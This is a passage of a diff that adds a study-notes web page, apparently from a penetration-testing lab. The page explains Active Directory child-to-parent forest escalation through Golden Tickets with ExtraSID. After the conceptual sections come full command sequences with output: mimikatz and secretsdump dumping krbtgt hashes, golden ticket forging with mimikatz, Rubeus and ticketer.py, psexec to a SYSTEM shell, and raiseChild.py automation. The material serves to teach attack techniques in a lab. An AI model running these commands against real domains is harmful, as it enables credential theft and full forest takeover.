+<li><p>KRBTGT hash</p></li>
+</ul>
+<p>This is <strong>post-compromise escalation</strong>, not initial access.</p>
+<hr />
+<p><strong>🧩 Step 2: Attacker Forges a TGT</strong></p>
+<p>They create a TGT with:</p>
+<ul>
+<li><p>Fake username</p></li>
+<li><p>Valid child domain SID</p></li>
+<li><p>Signed with child KRBTGT hash</p></li>
+</ul>
+<p>So far:</p>
+<pre><code>
+Ticket is 100% valid cryptographically
+</code></pre>
+<hr />
+<p><strong>🧩 Step 3: ExtraSID Is Added</strong></p>
+<p>Attacker inserts:</p>
+<pre><code>
+Parent Enterprise Admin SID
+</code></pre>
+<p>This goes into:</p>
+<pre><code>
+PAC → ExtraSIDs[]
+</code></pre>
+<p>At this point:</p>
+<ul>
+<li><p>No AD object modified</p></li>
+<li><p>No sidHistory attribute touched</p></li>
+</ul>
+<hr />
+<p><strong>🧩 Step 4: Ticket Is Injected (PTT)</strong></p>
+<p>The forged TGT is loaded into LSASS.</p>
+<p>From Windows’ view:</p>
+<pre><code>
+User authenticated successfully
+</code></pre>
+<hr />
+<p><strong>🧩 Step 5: Accessing Parent Domain Resource</strong></p>
+<p>When attacker accesses:</p>
+<pre><code>
+\\parent-dc\c$
+</code></pre>
+<p>Parent DC performs:</p>
+<p><strong>✔ Authentication</strong></p>
+<ul>
+<li><p>Ticket signature valid</p></li>
+<li><p>Trust exists</p></li>
+</ul>
+<p><strong>✔ Authorization</strong></p>
+<ul>
+<li><p>Extract PAC</p></li>
+<li><p>Build access token</p></li>
+</ul>
+<p>Token contains:</p>
+<pre><code>
+User SID (child)
+
++ ExtraSID (Enterprise Admin)
+</code></pre>
+<hr />
+<p><strong>🧩 Step 6: Authorization Decision</strong></p>
+<p>ACL on parent DC:</p>
+<pre><code>
+Allow: Enterprise Admins
+</code></pre>
+<p>Token check:</p>
+<pre><code>
+Does tokencontain EA SID?
+
+→ YES (ExtraSID)
+
+→ ACCESS GRANTED
+</code></pre>
+<p>💥 No group membership check</p>
+<p>💥 No SID origin validation</p>
+<p>💥 No alert by default</p>
+<hr />
+<h3 id="why-this-is-called-sid-history-priming">8️⃣ Why This Is Called “SID History Priming”</h3>
+<p>Because:</p>
+<ul>
+<li><p>You are <strong>pre-loading authorization SIDs</strong></p></li>
+<li><p>Before any access check</p></li>
+<li><p>Without modifying AD</p></li>
+</ul>
+<p>It’s <strong>logical SIDHistory</strong>, not physical.</p>
+<hr />
+<h3 id="why-this-enables-dcsync-in-parent-domain">9️⃣ Why This Enables DCSync in Parent Domain</h3>
+<p>DCSync checks:</p>
+<pre><code>
+Does caller have Replication privileges?
+</code></pre>
+<p>Enterprise Admins:</p>
+<ul>
+<li>Have replication rights forest-wide</li>
+</ul>
+<p>Since the <strong>EA SID exists in token</strong>:</p>
+<pre><code>
+DCSync allowed
+</code></pre>
+<p>This completes <strong>forest compromise</strong>.</p>
+<h3 id="why-the-username-isnt-re-checked">Why the Username Isn’t Re-checked</h3>
+<p>Once a ticket is issued, the system assumes:</p>
+<pre><code>
+The KDC already validated this user earlier
+</code></pre>
+<p>So the service server only checks:</p>
+<pre><code>
+✔ Ticket signature
+
+✔ Ticket validity time
+
+✔ Authorization SIDs
+</code></pre>
+<p>Not:</p>
+<pre><code>
+❌ Does the user object exist?
+</code></pre>
+<p>Because the <strong>KDC is the source of truth</strong>.</p>
+<p>Golden Ticket works because attackers <strong>steal the KDC signing key (KRBTGT)</strong> and impersonate it.</p>
+<hr />
+<h3 id="why-this-attack-is-so-powerful">🔥 Why This Attack Is So Powerful</h3>
+<div class="line-block">Reason | Impact |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">No AD modification | Very stealthy |</div>
+<div class="line-block">Uses valid crypto | No ticket tampering alerts |</div>
+<div class="line-block">Works intra-forest | Child → Parent escalation |</div>
+<div class="line-block">Persistent | Until KRBTGT reset |</div>
+<hr />
+<h3 id="why-external-trusts-usually-block-this">🛡️ Why External Trusts Usually Block This</h3>
+<p>External trusts:</p>
+<ul>
+<li><p>Have SID filtering <strong>enabled</strong></p></li>
+<li><p>Strip foreign high-privilege SIDs</p></li>
+</ul>
+<p>So:</p>
+<pre><code>
+ExtraSID removed → attack fails
+</code></pre>
+<p>This is why <strong>forest trust context matters</strong>.</p>
+<hr />
+<h3 id="mental-model-lock-keys">🧠 Mental Model (Lock &amp; Keys)</h3>
+<pre><code>
+Golden Ticket =Valid passport
+
+ExtraSID = VIPaccess badge
+
+Trust = Border agreement
+
+SID filtering =Securitycheckpoint
+
+Nocheckpoint + VIP badge = unrestrictedaccess
+</code></pre>
+<hr />
+<h3 id="final-attack-logic-recap-pure-logic">🧾 Final Attack Logic Recap (Pure Logic)</h3>
+<ol type="1">
+<li><p>Forest trust allows child tickets</p></li>
+<li><p>SID filtering disabled</p></li>
+<li><p>PAC includes ExtraSID</p></li>
+<li><p>Authorization trusts PAC</p></li>
+<li><p>ACL matches SID</p></li>
+<li><p>Access granted</p></li>
+<li><p>Domain escalated</p></li>
+</ol>
+<h3 id="sid-history-kerberos-pac">Sid History &amp; Kerberos Pac</h3>
+<h3 id="sidhistory-the-active-directory-attribute">1️⃣ <code>sidHistory</code> — the <strong>Active Directory attribute</strong></h3>
+<p><strong>What it is</strong></p>
+<p><code>sidHistory</code> is a <strong>real, legitimate, multi-valued AD attribute</strong> on <strong>user and computer objects</strong>.</p>
+<p><strong>Purpose (legitimate):</strong></p>
+<ul>
+<li><p>Preserve access during <strong>account/domain migrations</strong></p></li>
+<li><p>Allow users to keep access to resources secured with <strong>old SIDs</strong></p></li>
+</ul>
+<p><strong>Key point:</strong></p>
+<blockquote>
+<p>sidHistory does nothing by itself — it only becomes effective during logon.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<p><strong>Where it lives</strong></p>
+<ul>
+<li><p>Stored in AD database (<code>NTDS.dit</code>)</p></li>
+<li><p>On objects like:</p></li>
+</ul>
+<pre><code>
+CN=User,CN=Users,DC=domain,DC=local
+</code></pre>
+<ul>
+<li>Contains one or more <strong>old SIDs</strong></li>
+</ul>
+<p>Example conceptual value:</p>
+<pre><code>
+sidHistory:
+
+  S-1-5-21-OLD-DOMAIN-1001
+
+  S-1-5-21-OLD-DOMAIN-512
+</code></pre>
+<hr />
+<h3 id="what-windows-does-with-sidhistory"><strong>What Windows does with <code>sidHistory</code></strong></h3>
+<p>When a user authenticates:</p>
+<ol type="1">
+<li><p><strong>KDC reads the user object</strong></p></li>
+<li><p>Finds <code>sidHistory</code> values</p></li>
+<li><p>Treats them as <strong>additional identities</strong></p></li>
+<li><p>Forwards them into the Kerberos authorization data</p></li>
+</ol>
+<p>⚠️ <strong>No privilege check is done on the SID values themselves</strong></p>
+<h3 id="why-sidhistory-extrasid-exists">Why SIDHistory / ExtraSID Exists</h3>
+<p>The <strong>ExtraSID concept exists mainly for migrations</strong>.</p>
+<p>Example scenario:</p>
+<p>Company migration:</p>
+<pre><code>
+OLD-DOMAIN.LOCAL
+
+        ↓
+
+NEW-DOMAIN.LOCAL
+</code></pre>
+<p>Users move to a new domain but must <strong>retain access to old resources</strong>.</p>
+<p>Microsoft solves this with <strong>SIDHistory</strong>.</p>
+<p>User after migration:</p>
+<pre><code>
+Primary SID  → New domain
+
+SIDHistory   → Old domain
+</code></pre>
+<p>So when the user accesses an old file server:</p>
+<pre><code>
+File ACL contains OLD-DOMAIN SID
+</code></pre>
+<p>Access still works because the SID is present in the token</p>
+<hr />
+<h3 id="kerberos-pac-where-authorization-actually-happens">2️⃣ Kerberos PAC — where authorization actually happens</h3>
+<p><strong>What is the PAC?</strong></p>
+<p>The <strong>Privilege Attribute Certificate (PAC)</strong> is a data structure embedded inside Kerberos tickets.</p>
+<p><strong>It is NOT authentication data</strong></p>
+<p>It is <strong>authorization data</strong>.</p>
+<p>PAC contains:</p>
+<ul>
+<li><p>User SID</p></li>
+<li><p>Group SIDs</p></li>
+<li><p>Privileges</p></li>
+<li><p><strong>ExtraSIDs</strong></p></li>
+<li><p>Domain info</p></li>
+</ul>
+<hr />
+<p><strong>PAC is what Windows trusts for access decisions</strong></p>
+<p>When a resource is accessed:</p>
+<pre><code>
+Kerberos Ticket → PAC → Access Token → ACL check
+</code></pre>
+<p>ACLs never query AD again.</p>
+<hr />
+<h3 id="extrasid-the-pac-representation-of-sidhistory">3️⃣ ExtraSID — the <strong>PAC representation of sidHistory</strong></h3>
+<p><strong>What ExtraSID is</strong></p>
+<p><strong>ExtraSID is a field inside the PAC</strong> that holds:</p>
+<blockquote>
+<p>SIDs that should be treated exactly like group SIDs during authorization</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>In normal operation:</p>
+<pre><code>
+PAC.ExtraSids ← AD.sidHistory
+</code></pre>
+<hr />
+<h3 id="important-equivalence-this-is-the-core">Important equivalence (THIS IS THE CORE)</h3>
+<blockquote>
+<p>Windows makes NO distinction between:</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<ul>
+<li>Group membership SIDs</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>SIDHistory SIDs</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>ExtraSIDs in PAC</li>
+</ul>
+</blockquote>
+<p>If the SID is present in the token → <strong>it grants access</strong></p>
+<hr />
+<h3 id="legitimate-end-to-end-flow-normal-scenario">4️⃣ Legitimate End-to-End Flow (Normal Scenario)</h3>
+<p>Let’s connect everything.</p>
+<p><strong>Step-by-step:</strong></p>
+<ol type="1">
+<li><p>User logs in</p></li>
+<li><p>KDC authenticates user</p></li>
+<li><p>KDC reads AD object</p></li>
+<li><p>Finds:</p>
+<ul>
+<li>Primary SID</li>
+<li>Group memberships</li>
+<li><code>sidHistory</code></li>
+</ul></li>
+<li><p>Builds PAC:</p>
+<pre><code>PAC.Groups    = Domain groups
+PAC.ExtraSids = sidHistory values
+</code></pre></li>
+<li><p>Ticket issued</p></li>
+<li><p>Client accesses resource</p></li>
+<li><p>Resource server builds access token</p></li>
+<li><p>Token contains <strong>all SIDs</strong></p></li>
+<li><p>ACL matches SID → access granted</p></li>
+</ol>
+<p>✔ That is the <strong>legitimate use case</strong></p>
+<h3 id="logic-conditions">Logic + Conditions</h3>
+<h3 id="parentchild-trust-must-exist-inside-the-same-forest">1️⃣ Parent–Child Trust Must Exist (Inside the Same Forest)</h3>
+<p>For the <strong>ExtraSID / child → parent Golden Ticket escalation</strong> to work, the domains must be connected like this:</p>
+<pre><code>
+Forest
+
+│
+
+└── ROOT DOMAIN
+
+    INLANEFREIGHT.LOCAL
+
+        │
+
+        ├── CHILD DOMAIN
+
+        │   LOGISTICS.INLANEFREIGHT.LOCAL
+
+        │
+
+        └── CHILD DOMAIN
+
+            HR.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>When a child domain is created, <strong>Active Directory automatically creates a trust</strong>.</p>
+<p>Properties of this trust:</p>
+<pre><code>
+✔ Two-way
+
+✔ Transitive
+
+✔ Inside same forest
+
+✔ SID filtering disabled
+</code></pre>
+<p>This is the <strong>exact condition that enables the attack</strong>.</p>
+<hr />
+<h3 id="why-the-trust-is-required">2️⃣ Why the Trust Is Required</h3>
+<p>When the parent DC receives a ticket issued by the child domain, it checks:</p>
+<pre><code>
+Was this ticket issued by a trusted domain?
+</code></pre>
+<p>Because the trust exists:</p>
+<pre><code>
+LOGISTICS  → trusted by → INLANEFREIGHT
+</code></pre>
+<p>the parent domain accepts the ticket.</p>
+<p>Without this trust:</p>
+<pre><code>
+Ticket rejected
+</code></pre>
+<hr />
+<h3 id="what-happens-during-the-attack">3️⃣ What Happens During the Attack</h3>
+<p>You compromise the <strong>child domain</strong>:</p>
+<pre><code>
+LOGISTICS.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>You obtain:</p>
+<pre><code>
+Child Domain KRBTGT hash
+
+Child Domain SID
+</code></pre>
+<p>Then you forge a ticket:</p>
+<pre><code>
+User: attacker
+
+Domain: LOGISTICS
+
+Primary SID
+
+LOGISTICS user SID
+
+ExtraSID
+
+INLANEFREIGHT Enterprise Admin SID
+</code></pre>
+<p>Because <strong>SID filtering is disabled inside the forest</strong>, the parent domain keeps the ExtraSID.</p>
+<hr />
+<h3 id="what-the-parent-domain-controller-thinks">4️⃣ What the Parent Domain Controller Thinks</h3>
+<p>When the forged ticket reaches the parent DC:</p>
+<pre><code>
+Step 1
+
+Ticket signed by LOGISTICS KRBTGT
+</code></pre>
+<p>Parent thinks:</p>
+<pre><code>
+✔ Issued by LOGISTICS domain controller
+
+✔ LOGISTICS is trusted
+</code></pre>
+<p>So it proceeds.</p>
+<p>Then:</p>
+<pre><code>
+Step 2
+
+Token creation
+</code></pre>
+<p>Parent DC reads SIDs in the ticket:</p>
+<pre><code>
+User SID
+
+Extra SID → Enterprise Admin
+</code></pre>
+<p>Token built:</p>
+<pre><code>
+LOGISTICS\attacker
+
+Enterprise Admin
+</code></pre>
+<p>Now the attacker effectively becomes <strong>Enterprise Admin of the forest</strong>.</p>
+<h3 id="when-this-attack-would-not-work">5️⃣ When This Attack Would NOT Work</h3>
+<p>This attack fails if:</p>
+<h3 id="no-trust-exists">❌ No trust exists</h3>
+<p>Example:</p>
+<pre><code>
+COMPANY.LOCAL
+
+LAB.LOCAL
+</code></pre>
+<p>Two completely separate forests.</p>
+<p>Then:</p>
+<pre><code>
+Ticket from LAB → rejected by COMPANY
+</code></pre>
+<hr />
+<h3 id="sid-filtering-is-enabled">❌ SID filtering is enabled</h3>
+<p>External trusts normally enable SID filtering.</p>
+<p>Meaning:</p>
+<pre><code>
+Foreign SIDs removed from ticket
+</code></pre>
+<p>So the injected <strong>Enterprise Admin SID disappears</strong>.</p>
+<hr />
+<h3 id="the-key-requirement-pentester-mental-checklist">6️⃣ The Key Requirement (Pentester Mental Checklist)</h3>
+<p>For <strong>child → parent escalation</strong>:</p>
+<pre><code>
+1️⃣ Same forest
+
+2️⃣ Parent-child trust exists
+
+3️⃣ SID filtering disabled (default intra-forest)
+
+4️⃣ Child domain KRBTGT compromised
+</code></pre>
+<p>Then the attack works.</p>
+<h3 id="windows">Windows</h3>
+<h3 id="step-1-dump-krbtgt-hash-child-domain-1">🔍 Step 1: Dump KRBTGT Hash (Child Domain)</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+</code></pre>
+<p><strong>Purpose:</strong> Retrieve NTLM hash of KRBTGT account to sign forged Kerberos tickets.</p>
+<p><strong>Output:</strong></p>
+<pre><code>
+Hash NTLM: 9d765b482771505cbe97411065964d5f
+</code></pre>
+<hr />
+<h3 id="step-2-get-child-domain-sid-1">🔍 Step 2: Get Child Domain SID</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+Get-DomainSID
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>
+S-1-5-21-2806153819-209893948-922872689
+</code></pre>
+<hr />
+<h3 id="step-3-get-parent-domain-enterprise-admins-group-sid">🔍 Step 3: Get Parent Domain Enterprise Admins Group SID</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot;
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>
+S-1-5-21-3842939050-3880317879-2865463114-519
+</code></pre>
+<hr />
+<h3 id="step-4-confirm-no-access-before-attack">🛑 Step 4: Confirm No Access (Before Attack)</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+ls \\academy-ea-dc01.inlanefreight.local\c$
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>
+Access is denied
+</code></pre>
+<hr />
+<h3 id="step-5-create-golden-ticket-with-extrasid-using-mimikatz">🎟️ Step 5: Create Golden Ticket with ExtraSID Using Mimikatz</h3>
+<p><strong>Command:</strong></p>
+<pre><code>
+mimikatz
+
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL `
+
+/sid:S-1-5-21-2806153819-209893948-922872689 `
+
+/krbtgt:9d765b482771505cbe97411065964d5f `
+
+/sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+</code></pre>
+<p><strong>Explanation:</strong></p>
+<ul>
+<li><p>Creates a forged TGT for <code>hacker@LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p></li>
+<li><p><code>ExtraSID</code> adds <strong>Enterprise Admin group</strong> from parent.</p></li>
+<li><p><code>/ptt</code> – Inject the ticket directly into memory.</p></li>
+</ul>
+<p><strong>Output Summary:</strong></p>
+<pre><code>
+[*] Forged a TGT for &#39;hacker&#39;
+
+[*] Extra SIDs: S-1-5-21-...-519
+
+[+] Ticket successfully submitted for current session
+</code></pre>
+<hr />
+<h3 id="step-6-verify-ticket-injection-memory">📄 Step 6: Verify Ticket Injection (Memory)</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+klist
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>
+Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+
+Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL
+
+Flags: forwardable renewable initial
+</code></pre>
+<hr />
+<h3 id="step-7-access-parent-domain-dc-1">🗂️ Step 7: Access Parent Domain DC</h3>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+ls \\academy-ea-dc01.inlanefreight.local\c$
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>
+Volume in drive ... has no label.
+
+Directory of \\academy-ea-dc01.inlanefreight.local\c$
+
+Program Files, Users, Windows, etc.
+</code></pre>
+<p>✅ <strong>Access granted!</strong></p>
+<hr />
+<h2 id="alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</h2>
+<h3 id="command">🔧 Command:</h3>
+<pre class="powershell"><code>
+powershell
+
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f `
+
+/domain:LOGISTICS.INLANEFREIGHT.LOCAL `
+
+/sid:S-1-5-21-2806153819-209893948-922872689 `
+
+/sids:S-1-5-21-3842939050-3880317879-2865463114-519 `
+
+/user:hacker /ptt
+</code></pre>
+<p>✅ Successfully injects ticket with <code>ExtraSID</code> via Rubeus.</p>
+<hr />
+<h2 id="step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</h2>
+<p><strong>Command:</strong></p>
+<pre class="powershell"><code>
+powershell
+
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+</code></pre>
+<p><strong>Explanation:</strong></p>
+<ul>
+<li><p>Targeting an account in the <strong>parent domain</strong>.</p></li>
+<li><p>If successful → attacker is treated as Enterprise Admin (SID spoofed!).</p></li>
+</ul>
+<p><strong>Output:</strong></p>
+<pre><code>
+NTLM Hash of lab_adm: 663715a1a8b957e8e9943cc98ea451b6
+</code></pre>
+<h3 id="linux">Linux</h3>
+<h3 id="step-1-extract-krbtgt-hash-child-domain">✅ Step 1: Extract KRBTGT Hash (Child Domain)</h3>
+<pre class="bash"><code>
+bash
+
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+</code></pre>
+<p><strong>🔍 Breakdown:</strong></p>
+<ul>
+<li><p><code>just-dc-user</code>: dump a specific user’s secrets</p></li>
+<li><p><code>LOGISTICS/krbtgt</code>: KRBTGT user of child domain</p></li>
+<li><p>Output includes NTLM and Kerberos keys</p></li>
+</ul>
+<p><strong>🖥️ Sample Output:</strong></p>
+<pre><code>
+ruby
+
+krbtgt:502:aad3b...:9d765b482771505cbe97411065964d5f:::
+</code></pre>
+<hr />
+<h3 id="step-2-find-child-domain-sid">✅ Step 2: Find Child Domain SID</h3>
+<pre class="bash"><code>
+bash
+
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+</code></pre>
+<hr />
+<h3 id="step-3-find-enterprise-admins-sid-in-root-domain">✅ Step 3: Find Enterprise Admins SID in Root Domain</h3>
+<pre class="bash"><code>
+bash
+
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;
+
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+
+...
+
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+
+S-1-5-21-3842939050-3880317879-2865463114-519
+</code></pre>
+<hr />
+<h3 id="step-4-create-golden-ticket-with-ticketer.py">✅ Step 4: Create Golden Ticket with <code>ticketer.py</code></h3>
+<pre class="bash"><code>
+bash
+
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
+
+-domain LOGISTICS.INLANEFREIGHT.LOCAL \
+
+-domain-sid S-1-5-21-2806153819-209893948-922872689 \
+
+-extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
+
+hacker
+</code></pre>
+<p><strong>🔍 Explanation:</strong></p>
+<ul>
+<li><p><code>nthash</code>: NTLM of krbtgt (child)</p></li>
+<li><p><code>extra-sid</code>: parent domain EA SID = SIDHistory field</p></li>
+<li><p><code>hacker</code>: username (can be nonexistent)</p></li>
+<li><p>Output: <code>hacker.ccache</code></p></li>
+</ul>
+<hr />
+<h3 id="step-5-set-the-environment-variable">✅ Step 5: Set the Environment Variable</h3>
+<pre class="bash"><code>
+export KRB5CCNAME=hacker.ccache
+</code></pre>
+<p>✅ Now, your system uses the forged Kerberos ticket.</p>
+<hr />
+<h3 id="step-6-use-psexec.py-to-get-system-shell-on-parent-dc">✅ Step 6: Use <code>psexec.py</code> to Get SYSTEM Shell on Parent DC</h3>
+<pre class="bash"><code>
+bash
+
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Microsoft Windows [Version 10.0.17763.107]
+
+C:\Windows\system32&gt; whoami
+
+nt authority\system
+</code></pre>
+<p><strong>🔍 Flags:</strong></p>
+<ul>
+<li><p><code>k</code>: use kerberos</p></li>
+<li><p><code>no-pass</code>: no password needed (we’re using the forged ticket)</p></li>
+</ul>
+<h3 id="automated-attack-with-raisechild.py">🤖 <strong>Automated Attack with <code>raiseChild.py</code></strong></h3>
+<p><strong>🔁 What it Does:</strong></p>
+<p>Performs the entire attack chain:</p>
+<ul>
+<li><p>Gets child krbtgt hash</p></li>
+<li><p>Builds ticket with parent EA SID</p></li>
+<li><p>Authenticates to parent DC</p></li>
+<li><p>Extracts parent domain admin credentials</p></li>
+<li><p>Launches psexec shell</p></li>
+</ul>
+<hr />
+<p><strong>🔧 Run Command:</strong></p>
+<pre class="bash"><code>
+bash
+
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+
+[*] Enterprise Admin SID: S-1-5-21-3842939050-3880317879-2865463114-519
+
+[*] Getting credentials for LOGISTICS krbtgt
+
+[*] Getting credentials for INLANEFREIGHT krbtgt
+
+[*] Opening PSEXEC shell at ACADEMY-EA-DC01
+
+C:\Windows\system32&gt; whoami
+
+nt authority\system
+</code></pre>
+</article>
+  <aside class="toc-rail"><div class="toc-title">On this page</div><ul>
+<li class="lvl2"><a href="#golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</a></li>
+<li class="lvl2"><a href="#extra-sid-attack">Extra Sid Attack</a></li>
+<li class="lvl2"><a href="#alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</a></li>
+<li class="lvl2"><a href="#step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</a></li>
+</ul></aside>
+</div>
+
+</main>
+</div>
+<button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">🌙</button>
+<button class="totop" id="toTop" onclick="scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/fulltext-index.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
